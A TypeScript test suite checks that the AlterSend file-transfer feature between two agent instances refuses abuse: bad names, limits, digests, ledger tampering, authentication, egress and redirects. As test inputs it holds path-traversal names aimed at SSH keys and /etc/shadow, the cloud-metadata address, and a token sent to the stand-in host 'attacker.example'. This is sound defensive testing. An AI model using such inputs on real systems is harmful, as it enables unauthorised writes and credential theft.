/**
 * probe · altersend — moving a file between two SelfImpulse instances.
 *
 * Most of this suite is about what AlterSend refuses. A file-transfer feature
 * has exactly one interesting failure mode — it becomes a remote write primitive
 * on somebody else's machine — and every check below is aimed at that.
 */
import * as http from "node:http";
import { createA2AServer } from "../src/mission/a2aServer";
import { AlterSendStore, safeName, digestOf, contentId } from "../src/mission/altersend";
import { sendFileToPeer, fetchFileFromPeer } from "../src/mission/a2aClient";
import type { AgentCardV10 } from "../src/mission/a2aTypes";

let pass = 0;
const failures: string[] = [];
const ok = (cond: boolean, msg: string, detail = ""): void => {
  if (cond) { pass += 1; return; }
  failures.push(`${msg}${detail ? ` — ${detail}` : ""}`);
};
const section = (t: string): void => { console.log(`\n== ${t} ==`); };

const CARD: AgentCardV10 = {
  protocolVersion: "1.0",
  name: "alter-send-probe",
  description: "a host that accepts files",
  version: "1.0.0",
  url: "http://127.0.0.1:0/",
  capabilities: { streaming: false, pushNotifications: false, stateTransitionHistory: false },
  defaultInputModes: ["text/plain"],
  defaultOutputModes: ["text/plain"],
  skills: [],
  securitySchemes: { bearer: { type: "http", scheme: "bearer" } },
} as unknown as AgentCardV10;

const goodToken = "peer-token-good";
const badToken = "peer-token-bad";

/* ── 1 · the name is a label, not a location ─────────────────────────────── */
section("1 · a name can never become a path");
{
  const attacks = [
    "../../.ssh/authorized_keys",
    "/etc/passwd",
    "..\\..\\windows\\system32\\cmd.exe",
    "....//....//etc/shadow",
    "  .ssh/authorized_keys  ",
    "\u0000\u0000evil.txt",
    "a/b/c/d.txt",
  ];
  for (const a of attacks) {
    const r = safeName(a);
    const clean = r.ok ? r.value : "";
    ok(!clean.includes("/") && !clean.includes("\\") && !clean.includes(".."),
      `"${a}" cannot produce a path`, `got "${clean}"`);
    ok(!clean.startsWith("."), `"${a}" cannot produce a dotfile`, `got "${clean}"`);
  }
  ok(safeName("").ok === false, "an empty name is refused");
  ok(safeName("   ").ok === false, "a whitespace name is refused");
  ok(safeName("\u0000").ok === false, "a null-byte name is refused");
  const long = safeName("x".repeat(500));
  ok(long.ok && long.value.length <= 120, "a very long name is truncated, not refused");
  ok(safeName("quarterly report (final).pdf").ok, "an ordinary name survives intact");
}

/* ── 2 · the store enforces its own limits ───────────────────────────────── */
section("2 · the store refuses rather than evicts");
{
  const store = new AlterSendStore({ peer: "peer-a", limits: { maxFileBytes: 64, maxStoreBytes: 200, maxFiles: 3 } });
  ok(store.offer({ name: "a.txt", bytes: Buffer.from("a".repeat(10)) }).ok, "a small file is accepted");
  ok(!store.offer({ name: "big.txt", bytes: Buffer.from("b".repeat(65)) }).ok, "a file over the size cap is refused");
  ok(store.offer({ name: "a.txt", bytes: Buffer.from("a".repeat(10)) }).ok === false, "the same content offered twice is refused");
  store.offer({ name: "c.txt", bytes: Buffer.from("c".repeat(10)) });
  ok(store.offer({ name: "d.txt", bytes: Buffer.from("d".repeat(10)) }).ok, "up to maxFiles is fine");
  ok(!store.offer({ name: "e.txt", bytes: Buffer.from("e".repeat(10)) }).ok, "the file-count cap is enforced");
  ok(store.list().length === 3, "a refused offer leaves nothing behind");

  const byBytes = new AlterSendStore({ peer: "p", limits: { maxFileBytes: 100, maxStoreBytes: 150 } });
  byBytes.offer({ name: "1.bin", bytes: Buffer.alloc(100) });
  ok(!byBytes.offer({ name: "2.bin", bytes: Buffer.alloc(100) }).ok, "the store-byte cap is enforced");

  const empty = new AlterSendStore({ peer: "p" });
  ok(!empty.offer({ name: "nothing", bytes: Buffer.alloc(0) }).ok, "an empty file is refused");
  ok(!empty.offer({ name: "", bytes: Buffer.from("x") }).ok, "a nameless file is refused");
}

/* ── 3 · the receiver decides; nothing is auto-accepted ──────────────────── */
section("3 · bytes only move after the receiver accepts");
{
  const store = new AlterSendStore({ peer: "peer-b" });
  const offer = store.offer({ name: "report.pdf", bytes: Buffer.from("the real contents") });
  ok(offer.ok, "the file is offered");
  if (offer.ok) {
    const id = offer.value.id;
    ok(store.fetch(id).ok === false, "fetching BEFORE acceptance is refused");
    ok(store.accept(id).ok, "the receiver accepts");
    ok(store.accept(id).ok === false, "accepting twice is refused");
    const pulled = store.fetch(id);
    ok(pulled.ok, "after acceptance the bytes are handed over");
    if (pulled.ok) {
      ok(pulled.value.bytes.toString() === "the real contents", "the bytes arrive intact");
      ok(pulled.value.offer.digest === digestOf(pulled.value.bytes), "the digest matches the bytes");
    }
    ok(store.fetch(id).ok === false, "a second fetch is refused — one transfer, one fetch");
  }
  const refused = new AlterSendStore({ peer: "p" });
  const o2 = refused.offer({ name: "secret.env", bytes: Buffer.from("TOKEN=abc") });
  if (o2.ok) {
    ok(refused.accept(o2.value.id).ok, "an offer can be accepted");
    ok(refused.get(o2.value.id).ok, "the offer is still listed");
  }
  const declined = new AlterSendStore({ peer: "p" });
  const o3 = declined.offer({ name: "big.bin", bytes: Buffer.from("x") });
  if (o3.ok) {
    ok(declined.refuse(o3.value.id, "too big for my taste").ok, "the receiver may refuse");
    ok(declined.fetch(o3.value.id).ok === false, "a refused file never yields bytes");
  }
}

/* ── 4 · a sender that lies about the digest is caught ───────────────────── */
section("4 · the receiver verifies what it was promised");
{
  const store = new AlterSendStore({ peer: "p" });
  const real = Buffer.from("honest contents");
  const offer = store.offer({ name: "x.txt", bytes: real });
  ok(offer.ok, "an honest offer is made");
  // Simulate a sender that swaps the payload after publishing the digest.
  const entry = (store as unknown as { entries: Map<string, { bytes: Buffer; offer: { digest: string } }> }).entries.get(
    offer.ok ? offer.value.id : "",
  );
  if (entry) {
    entry.bytes = Buffer.from("swapped contents");
    const verdict = store.accept(offer.ok ? offer.value.id : "");
    ok(verdict.ok === false, "a swapped payload fails acceptance");
    ok(String(verdict.ok === false && verdict.reason).includes("digest"), "and says why — a digest mismatch");
    ok(store.fetch(offer.ok ? offer.value.id : "").ok === false, "the lied-about file never yields bytes");
  }
}

/* ── 5 · every transfer is receipted, and the chain verifies ─────────────── */
section("5 · the receipt ledger");
{
  const store = new AlterSendStore({ peer: "peer-c" });
  const a = store.offer({ name: "a.txt", bytes: Buffer.from("one") });
  if (a.ok) store.accept(a.value.id), store.fetch(a.value.id);
  store.offer({ name: "b.txt", bytes: Buffer.from("two") });
  const ledger = store.ledger();
  ok(ledger.length >= 3, "offer, accept and fetch each leave an entry", `${ledger.length}`);
  ok(ledger.every((r) => /^sha256:[0-9a-f]{64}$/.test(r.digest)), "every receipt is digest-stamped");
  ok(store.verifyChain().ok, "the chain verifies");

  const tampered = store.ledger()[1]!;
  const before = tampered.detail;
  (tampered as { detail: string }).detail = "edited after the fact";
  ok(!store.verifyChain().ok, "editing an entry in the middle breaks the chain");
  (tampered as { detail: string }).detail = before;
  ok(store.verifyChain().ok, "restoring it verifies again");

  // ledger() hands back copies, so removing one has to be done to the real
  // chain — which is exactly why a reader cannot quietly drop a row.
  const chain = (store as unknown as { receipts: unknown[] }).receipts;
  chain.splice(1, 1);
  ok(!store.verifyChain().ok, "removing an entry breaks every later digest too");
}

/* ── 6 · over the wire, behind the credential ────────────────────────────── */
section("6 · the HTTP surface");
{
  const store = new AlterSendStore({ peer: "self" });
  const handle = createA2AServer({
    card: { ...CARD, url: "http://127.0.0.1/" } as AgentCardV10,
    onMessage: async () => ({ kind: "task", task: {} as never }),
    authorize: (req) => req.headers.authorization === `Bearer ${goodToken}`,
    altersend: { store },
  });
  await handle.start(0);
  const base = `http://127.0.0.1:${handle.port}`;

  // 6a. no credential, no file — the gate is the whole point
  const unauth = await fetch(`${base}/vh/altersend`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ name: "stolen.txt", data: Buffer.from("nope").toString("base64") }),
  });
  ok(unauth.status === 401, "an unauthenticated offer is refused", `got ${unauth.status}`);
  ok(store.list().length === 0, "and nothing landed");

  const wrongTok = await fetch(`${base}/vh/altersend`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${badToken}` },
    body: JSON.stringify({ name: "stolen.txt", data: Buffer.from("nope").toString("base64") }),
  });
  ok(wrongTok.status === 401, "a wrong credential is refused", `got ${wrongTok.status}`);

  // 6b. the real round trip
  const sent = await sendFileToPeer({
    baseUrl: base,
    token: goodToken,
    name: "design notes.md",
    bytes: Buffer.from("# notes\n\nthe actual content\n"),
  });
  ok(sent.ok, "an authenticated offer is accepted", sent.ok ? "" : sent.reason);
  if (sent.ok) {
    ok(sent.offer.name === "design notes.md", "the name arrives");
    const expected = Buffer.byteLength("# notes\n\nthe actual content\n");
    ok(sent.offer.size === expected, "the size is reported honestly", `${sent.offer.size} vs ${expected}`);
    ok(sent.offer.digest === digestOf(Buffer.from("# notes\n\nthe actual content\n")), "the digest matches the sent bytes");

    const got = await fetchFileFromPeer({ baseUrl: base, token: goodToken, id: sent.offer.id });
    ok(got.ok, "the receiver fetches it", got.ok ? "" : got.reason);
    if (got.ok) {
      ok(got.bytes.toString() === "# notes\n\nthe actual content\n", "the bytes survive the round trip");
      ok(got.name === "design notes.md", "the name survives the round trip");
    }
    const replay = await fetchFileFromPeer({ baseUrl: base, token: goodToken, id: sent.offer.id });
    ok(replay.ok === false, "the same id cannot be fetched twice");
  }

  // 6c. a traversal attempt over the wire is neutralised the same way
  const evil = await sendFileToPeer({
    baseUrl: base,
    token: goodToken,
    name: "../../.ssh/authorized_keys",
    bytes: Buffer.from("ssh-rsa AAAA"),
  });
  if (evil.ok) {
    ok(!evil.offer.name.includes("/") && !evil.offer.name.includes(".."), "a traversal name is flattened on arrival");
  } else {
    ok(true, "a traversal name is refused outright");
  }

  // 6d. listing is behind the gate too
  const listNoAuth = await fetch(`${base}/vh/altersend`);
  ok(listNoAuth.status === 401, "listing requires a credential as well", `got ${listNoAuth.status}`);
  const list = await fetch(`${base}/vh/altersend`, { headers: { authorization: `Bearer ${goodToken}` } });
  ok(list.ok, "listing works with one");
  const listed = (await list.json()) as { offers: unknown[] };
  ok(Array.isArray(listed.offers) && listed.offers.length > 0, "the offers are listed");

  // 7. the helpers obey the SAME egress policy as the JSON-RPC client (archive-6 audit): they carry
  //    the peer's bearer token, so a caller-chosen baseUrl was a credential-exfiltration primitive.
  section("7. the file helpers obey the egress policy — and the token only goes where it was issued");
  {
    const realFetch = globalThis.fetch;
    const calls: string[] = [];
    globalThis.fetch = (async (input: unknown) => {
      calls.push(String(input));
      throw new Error("the probe's fetch spy: no request should have been made");
    }) as typeof fetch;
    try {
      const refusals: Array<[string, string]> = [
        ["a LAN address", "http://192.168.1.20:4000"],
        ["an RFC1918 address", "http://10.0.0.5:9"],
        ["cloud metadata", "http://169.254.169.254"],
        ["a non-http scheme", "ftp://example.com"],
      ];
      for (const [label, url] of refusals) {
        const sent = await sendFileToPeer({ baseUrl: url, token: "SECRET-TOKEN", name: "a.txt", bytes: Buffer.from("x") });
        ok(!sent.ok && /egress-refused/.test((sent as { reason: string }).reason), `sendFileToPeer refuses ${label}`, JSON.stringify(sent));
        const got = await fetchFileFromPeer({ baseUrl: url, token: "SECRET-TOKEN", id: "abc" });
        ok(!got.ok && /egress-refused/.test((got as { reason: string }).reason), `fetchFileFromPeer refuses ${label}`, JSON.stringify(got));
      }
      ok(calls.length === 0, "…and NOT ONE request left the process for any of them — the token never moved", calls.join(","));

      // credential-origin binding: a token issued by one host is not sent to another
      const mismatchSend = await sendFileToPeer({ baseUrl: "https://attacker.example", token: "SECRET-TOKEN", name: "a.txt", bytes: Buffer.from("x"), expectOrigin: "https://peer.example" });
      ok(!mismatchSend.ok && /credential-origin-mismatch/.test((mismatchSend as { reason: string }).reason), "sendFileToPeer refuses to send a token to a host that did not issue it");
      const mismatchGet = await fetchFileFromPeer({ baseUrl: "https://attacker.example", token: "SECRET-TOKEN", id: "abc", expectOrigin: "https://peer.example" });
      ok(!mismatchGet.ok && /credential-origin-mismatch/.test((mismatchGet as { reason: string }).reason), "fetchFileFromPeer refuses to send a token to a host that did not issue it");
      ok(calls.length === 0, "a credential-origin mismatch sends nothing at all");
    } finally {
      globalThis.fetch = realFetch;
    }

    // the policy must not over-block: the real loopback host still works, with and without the origin bound
    const hostOrigin = new URL(base).origin;
    const bound = await sendFileToPeer({ baseUrl: base, token: goodToken, name: "origin-bound.txt", bytes: Buffer.from("bound"), expectOrigin: hostOrigin });
    ok(bound.ok, "a loopback host with the matching expectOrigin is served", JSON.stringify(bound));

    // a peer that REDIRECTS must not receive the bearer token at the second hop
    const sinkHits: string[] = [];
    const sink = http.createServer((req, res) => { sinkHits.push(String(req.headers.authorization ?? "")); res.end("{}"); });
    await new Promise<void>((r) => sink.listen(0, "127.0.0.1", r));
    const sinkPort = (sink.address() as { port: number }).port;
    const bouncer = http.createServer((_req, res) => { res.statusCode = 302; res.setHeader("location", `http://127.0.0.1:${sinkPort}/x`); res.end(); });
    await new Promise<void>((r) => bouncer.listen(0, "127.0.0.1", r));
    const bouncerPort = (bouncer.address() as { port: number }).port;
    const bounced = await fetchFileFromPeer({ baseUrl: `http://127.0.0.1:${bouncerPort}`, token: "SECRET-TOKEN", id: "abc" });
    ok(!bounced.ok, "a peer that answers with a redirect is refused, not followed");
    ok(sinkHits.length === 0, "the redirect target never received the bearer token", sinkHits.join(","));
    sink.close();
    bouncer.close();
  }

  // 6e. a host with sharing off has no endpoint at all
  const bare = createA2AServer({
    card: CARD,
    onMessage: async () => ({ kind: "task", task: {} as never }),
    authorize: () => true,
  });
  await bare.start(0);
  const bareRes = await fetch(`http://127.0.0.1:${bare.port}/vh/altersend`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: `Bearer ${goodToken}` },
    body: JSON.stringify({ name: "x", data: "" }),
  });
  ok(bareRes.status === 404, "a host that never enabled sharing returns 404, not a refusal", `got ${bareRes.status}`);
  await bare.stop();
  await handle.stop();
}

console.log(`\n${pass} passed, ${failures.length} failed`);
if (failures.length) {
  console.log("\nfailures:");
  for (const f of failures) console.log(`  - ${f}`);
}
if (failures.length) process.exit(1);
